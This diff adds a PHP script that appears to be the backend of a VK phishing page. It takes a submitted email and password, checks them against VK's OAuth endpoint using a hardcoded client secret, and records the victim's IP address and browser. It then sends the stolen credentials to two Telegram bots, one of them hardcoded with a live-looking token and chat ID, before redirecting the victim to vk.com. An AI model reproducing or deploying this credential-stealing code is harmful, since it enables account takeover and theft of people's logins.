@@ -1,0 +1,21 @@
+﻿<?php include('config.php'); 
+$mail = $_POST['email']; 
+$pass = $_POST['pass']; 
+$get_time = date("d.m.Y (H:i:s)", time()); 
+$domain=$_SERVER["SERVER_NAME"]; 
+$ip = $_SERVER['REMOTE_ADDR']; 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL,'https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$mail.'&password='.$pass); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
+$helper = curl_exec($ch); 
+curl_close($ch); 
+$id= current (explode('}',end(explode('user_id":',$helper)))); 
+$arr = array( "Логин" => $mail, "Пароль" => $pass, "Дата" => $get_time, "IP" => $_SERVER['REMOTE_ADDR'], "Тип соединения" => $_SERVER['HTTP_CONNECTION'], "Браузер" => $_SERVER['HTTP_USER_AGENT']); 
+foreach($arr as $key => $value) { $txt .= "<b>".$key."</b>: ".$value."%0A"; } if ($mail != "" and $pass != "") { if(preg_match('/[a-zA-Z]/', $id)) { echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; 
+URL=http://{$domain}/error.html'></head></html>"; 
+} if(!(preg_match('/[a-zA-Z]/', $id))) { $fp=fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r"); 
+$fp=fopen("https://api.telegram.org/bot441818921:AAErEH6qz62sP78UqD_pY0E4DZhdxyP9QZo/sendMessage?chat_id=78615346&parse_mode=html&text={$txt}","r"); 
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; 
+URL=https://vk.com'></head></html>"; } }
